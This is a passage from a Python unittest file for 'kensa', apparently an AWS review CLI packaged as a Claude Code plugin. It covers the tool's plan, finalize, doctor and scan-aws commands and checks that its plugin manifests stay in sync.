        run(["plan", "--skip", "aws,repo"], self.d)
        code, out, _ = run(["finalize"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("unresolved items set to", out)

    def test_finalize_notes_pending_scans_and_unanswered_cards(self):
        self.seeded()
        run(["plan", "--skip", "repo"], self.d)       # aws is neither scanned nor skipped
        code, out, _ = run(["finalize"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("aws scan has not been run", out)

    def test_plan_numbers_steps_in_sequence_and_hides_local_paths(self):
        self.seeded()
        run(["scan-repo", "--path", self.tmp.name], self.d)
        code, out, _ = run(["plan"], self.d)
        steps = re.findall(r"^  (\d+)\. ", out, re.M)
        self.assertEqual(steps, [str(n) for n in range(1, len(steps) + 1)], out)
        self.assertNotIn(self.tmp.name, out)
        self.assertIn("repo (", out)

    def test_business_show_says_unanswered_instead_of_none(self):
        run(["init"], self.d)
        code, out, _ = run(["business", "show"], self.d)
        self.assertIn("(current value: unanswered)", out)
        self.assertNotIn("current value: None", out)
        self.assertNotIn("current value: []", out)
        run(["business", "answer", "B-CRITICALITY", "--option", "high"], self.d)
        code, out, _ = run(["business", "show"], self.d)
        self.assertIn("(current value: 'high')", out)

    def test_scan_aws_without_a_region_explains_both_ways_to_set_it(self):
        self.seeded()
        code, _, err = run(["scan-aws"], self.d)
        self.assertEqual(code, 2)
        self.assertIn("--regions", err)
        self.assertIn("aws.regions", err)

    def test_every_cards_and_business_subcommand_has_help_text(self):
        p = kensa.build_parser()
        for top in ("cards", "business"):
            sub = next(a for a in p._subparsers._group_actions[0].choices[top]._subparsers._group_actions)
            for name, sp in sub.choices.items():
                self.assertTrue(any(ca.dest == name and ca.help for ca in sub._choices_actions), f"{top} {name} has no help")

    def test_doctor_is_offline_and_names_the_access_levels(self):
        code, out, _ = run(["doctor"], self.d)
        self.assertEqual(code, 0, out)
        for word in ("python", "uv", "boto3", "openpyxl", "Lv0", "Lv1", "Lv2", "init --demo"):
            self.assertIn(word, out)
        self.assertFalse(os.path.exists(self.d))      # a read-only command: it must not create the state directory
        run(["init"], self.d)
        run(["context", "set", "aws.profile=p1"], self.d)
        code, out, _ = run(["doctor"], self.d)
        self.assertIn("* Lv1", out)
        run(["context", "set", "aws.wa_profile=p2"], self.d)
        code, out, _ = run(["doctor"], self.d)
        self.assertIn("* Lv2", out)

    def test_missing_dependency_messages_recommend_uv(self):
        self.assertIn("uv run", read_text(os.path.join(SCRIPTS, "kensa_wa.py")))
        self.assertIn("uv run", read_text(os.path.join(SCRIPTS, "kensa_scan.py")))
        self.assertIn("uv run", read_text(os.path.join(SCRIPTS, "kensa.py")).split("openpyxl is required for xlsx", 1)[1][:200])


class ManifestSync(unittest.TestCase):
    """tools/sync_manifests.py: plugin.json is the single place to edit; the Claude Code manifests are derived from it."""
    def load(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("sync_manifests", os.path.join(ROOT, "tools", "sync_manifests.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod

    def test_repository_manifests_are_in_sync(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(self.load().main(["--check"]), 0)

    def test_a_version_bump_in_plugin_json_reaches_the_derived_files(self):
        import shutil
        mod = self.load()
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, ".claude-plugin"))
            for rel in ("plugin.json", os.path.join(".claude-plugin", "plugin.json"), os.path.join(".claude-plugin", "marketplace.json")):
                shutil.copy(os.path.join(ROOT, rel), os.path.join(d, rel))
            mod.SOURCE = os.path.join(d, "plugin.json")
            mod.CLAUDE_PLUGIN = os.path.join(d, ".claude-plugin", "plugin.json")
            mod.MARKETPLACE = os.path.join(d, ".claude-plugin", "marketplace.json")
            src = read_json(mod.SOURCE)
            src["version"] = "9.9.9"
            src["keywords"] = src["keywords"] + ["extra"]
            write_json(src, mod.SOURCE)
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                self.assertEqual(mod.main(["--check"]), 1)      # detected, nothing written
                self.assertEqual(read_json(mod.CLAUDE_PLUGIN)["version"], read_json(os.path.join(ROOT, "plugin.json"))["version"])
                self.assertEqual(mod.main([]), 0)               # rewritten
                self.assertEqual(mod.main(["--check"]), 0)
            cc, mk = read_json(mod.CLAUDE_PLUGIN), read_json(mod.MARKETPLACE)
            self.assertEqual(cc["version"], "9.9.9")
            self.assertEqual(cc["keywords"][-1], "extra")
            self.assertEqual(cc["skills"], "./skills/")
            self.assertNotIn("$schema", cc)
            self.assertEqual((mk["metadata"]["version"], mk["plugins"][0]["version"]), ("9.9.9", "9.9.9"))


if __name__ == "__main__":
    unittest.main()
